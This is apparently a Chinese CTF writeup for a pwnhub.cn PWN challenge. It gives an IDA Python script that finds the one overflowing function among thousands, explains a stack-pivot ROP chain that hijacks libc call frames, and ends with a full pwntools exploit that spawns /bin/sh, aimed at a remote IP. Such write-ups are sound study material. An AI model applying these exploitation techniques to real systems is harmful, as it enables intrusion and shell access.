---
layout: post
title: pwnhub.cn 名字还在起 无题 writeup
categories: [PWN, Writeup]
description: pwnhub.cn 名字还在起 PWN题
keywords: WEB, PWN, Writeup
---

当天晚上跟大佬们出去high了没做题目，结果第二天起床之后就发现一血二血都被大佬们拿走了，膜

## 题目分析

刚拿到之后丢进IDA看了一下，好多函数。然后随便点几个函数进去，发现所有的函数都是一个形式的，我随便找几个大家感受一下就明白了：

```C
size_t func_17979()
{
  char ptr; // [rsp+0h] [rbp-C0h]@1

  fread(&ptr, 0xB3uLL, 1uLL, stdin);
  return fwrite("thank you for testing!!\n", 1uLL, 0x18uLL, stdout);
}

size_t func_60781()
{
  char ptr; // [rsp+0h] [rbp-C0h]@1

  fread(&ptr, 0xB5uLL, 1uLL, stdin);
  return fwrite("thank you for testing!!\n", 1uLL, 0x18uLL, stdout);
}

size_t func_92021()
{
  char ptr; // [rsp+0h] [rbp-20h]@1

  fread(&ptr, 0x15uLL, 1uLL, stdin);
  return fwrite("thank you for testing!!\n", 1uLL, 0x18uLL, stdout);
}

```

然后看了一下主函数的逻辑，发现上述的这些函数的调用方式为直接输入函数名字后面的数字就可以调到相应的函数，比如输入17979就会调func_17979。所以这个题目看起来像是从这将近3000长得差不多的函数里面找一个有溢出的函数。。orzzzz

于是我写了一个IDA脚本

```python
for addr in XrefsTo(0x00400550, flags=0):
	func=addr.frm;
	writesize=0;
	buffersize=0;
	while(1):
		if(Byte(func)==0xBE and Byte(func+2)==0x00 and Byte(func+3)==0x00 and Byte(func+4)==0x00):
			writesize=Byte(func+1)
		elif(Byte(func)==0xBE and Byte(func+3)==0x00 and Byte(func+4)==0x00 and Byte(func+5)==0x00):
			writesize=Word(func+1)
		if(Byte(func)==0x48 and Byte(func+1)==0x83 and Byte(func+2)==0xEC):
			buffersize=Byte(func+3)
			break;
		elif(Byte(func)==0x48 and Byte(func+1)==0x81 and Byte(func+2)==0xEC):
			buffersize=Byte
			break;
		elif(Byte(func)==0x48 and Byte(func+1)==0x83 and Byte(func+2)==0xC4):
			buffersize=Byte
			break;
		func-=1;
		if(addr.frm-func > 0x40):
			break;
	if writesize==0 or buffersize==0:
		print "error",hex(addr.frm)
	elif buffersize<writesize:
		print "oflow",hex(addr.frm),"buffersize="+str(hex(buffersize)),"writesize="+str(hex(writesize))
```

放在IDA里面跑一下 很快就输出了有漏洞的函数的offset

```
oflow 0x40d169L buffersize=0x20 writesize=0x30
```


## 漏洞利用

利用比较有技巧性的一点是这题的溢出只有0x10 Bytes，所以要把栈劫持到bss上，也就是做Stack Pivot。关于这一点做法其实很多，一种方法是不断调用有漏洞函数然后leave ret返回main，这样每次可以往bss段写0x20的数据，所来几次就可以把ROP chain写全。但是我觉得这样做太蛋疼了所以没这么干，就去想了想新方法，后面发现新方法更蛋疼。。。

我的ROP的做法如下

1. 第一次触发漏洞，在leave的时候改写rbp为bss的末端地址rbp1，返回漏洞函数的**sub     rsp, 20h**指令之后。
2. 第二次触发漏洞，由于rbp被劫持到rbp1，所以这一次fread会向rbp-0x20写入数据，且在leave到时候会改写rsp为rbp1，改写rbp为rbp2,其中rbp2为rbp1-0x20，返回一个能够读入0xd0字节的函数的**sub     rsp, d0h**指令之后。
3. 此时该函数会向rbp2-0xd0读入数据0xc1的数据，但是rsp的值却为rbp1，也就是rbp2+0x20，所以rbp和rsp的值是冲突的，这样会导致函数在读入过程中覆盖fread函数以及其调用链的栈帧本身，从而可以libc中fread函数以及接下来的调用链栈帧
4. 覆盖libc中的**\_\_memcpy\_sse2**的返回地址为pop rsp的地址，这样就可以劫持rsp到rbp2-0xd0，rbp2-0xd0在第三步的时候已经被准备好了gadget，接下来就愉快的ROP就可以，直接设置rsi rdi rdx 以及rax调syscall就好了

### 踩坑小记

我的做法主要是蛋疼之处在于依赖libc的版本，不同libc的版本fwrite函数的调用链栈帧可能不一样，当时我以为远程的系统版本应该是16.04所以我就在16.04调的exp，本地很快就过了，但是远程打不进去，我觉得很蛋疼，于是又在15.04 14.04测试了一下exp，都没有问题。心想该不会是16.10的系统吧，于是又现下了16.10版本，发现我的exp果然在16.10不work，想来是16.10的fwrite函数的调用链的栈帧跟之前的版本不一样了吧。改了几个offset之后打过去果然拿到了shell。




## Exploit

```python

from pwn import *;

port=17773
objname = "KLHFD34J"
objpath = "./"+objname
io = process(objpath)
elf = ELF(objpath)
def readuntil(delim):
    data = io.recvuntil(delim);
    return data;

def readlen(len):
    data = io.recv(len,1);
    return data;

def readall():
    data = io.recv(4096,1);
    return data;

def write(data):
    io.send(str(data));
    sleep(0.1);

def writeline(data):
    io.sendline(str(data));
    sleep(0.1);
def attack(ip=0):
    global io
    if ip != 0:
        io = remote(ip,port)
    rbp1=0x66c080+0xD0+0x20
    vulfunc=0x40D14E;
    rbp2=0x66c080+0xD0
    binsh=0x66c128
    read_d0=0x401866
    poprsp=0x0044a5c4
    rsp=0x66c080
    prdx=0x0040fe12
    pprsi=0x0044dc21
    prdi=0x0044dc23
    syscall=0x004379d7
    
    readuntil("function?\n")
    writeline(48607);
    payload1="A"*0x20;
    payload1+=p64(rbp1)
    payload1+=p64(vulfunc)
    write(payload1)
    
    payload2="B"*0x20
    payload2+=p64(rbp2)
    payload2+=p64(read_d0)
    write(payload2)

    payload3=p64(prdi)
    payload3+=p64(binsh-8);
    payload3+=p64(0x400590) #atoi
    payload3+=p64(pprsi)
    payload3+=p64(binsh+0x300);#rsi
    payload3+=p64(binsh+0x300);#r15
    payload3+=p64(prdi)
    payload3+=p64(binsh)
    payload3+=p64(prdx)
    payload3+=p64(0)
    payload3+=p64(syscall)
    payload3+="C"*(0x70-88);
    payload3+="D"*8;
    payload3+=p64(poprsp)
    payload3+=p64(rsp)
    payload3+="E"*24
    payload3+="59"+"\x00"*6;
    payload3+="/bin/sh\x00"
    payload3+="F"*0x11
    write(payload3)
    io.interactive();

#attack()
attack("54.223.81.128")
```
